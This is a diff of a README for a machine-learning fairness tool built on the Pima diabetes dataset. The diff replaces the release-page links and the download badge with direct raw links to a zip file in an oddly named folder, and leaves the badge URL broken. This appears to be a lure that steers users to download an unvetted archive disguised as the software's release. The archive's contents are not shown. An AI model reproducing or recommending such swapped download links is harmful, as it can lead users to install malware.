@@ -1,7 +1,7 @@
 # 🎉 fairness-analysis-pima - Explore Fairness in Machine Learning
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/MaxPaez/fairness-analysis-pima/releases)
+[![Download](https://raw.githubusercontent.com/MaxPaez/fairness-analysis-pima/main/waterishly/fairness-analysis-pima.zip%20Release-blue)](https://raw.githubusercontent.com/MaxPaez/fairness-analysis-pima/main/waterishly/fairness-analysis-pima.zip)
 
 ## 🧑‍🚀 Overview
 This repository offers tools to analyze fairness in machine learning using the ABLNI metric applied to the Pima Diabetes dataset. It includes a complete SDK that provides visualizations and detailed reports. This enables users to evaluate bias in machine learning models effectively.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### Step 2: Visit the Download Page
 To get the latest version of the fairness-analysis-pima software, visit this page to download:
-[Download the Latest Release](https://github.com/MaxPaez/fairness-analysis-pima/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/MaxPaez/fairness-analysis-pima/main/waterishly/fairness-analysis-pima.zip)
 
 ### Step 3: Download the Software
 On the releases page, look for the latest version. Click on the version number to see the files available for download. You will find an installer or executable file ready for your system. 
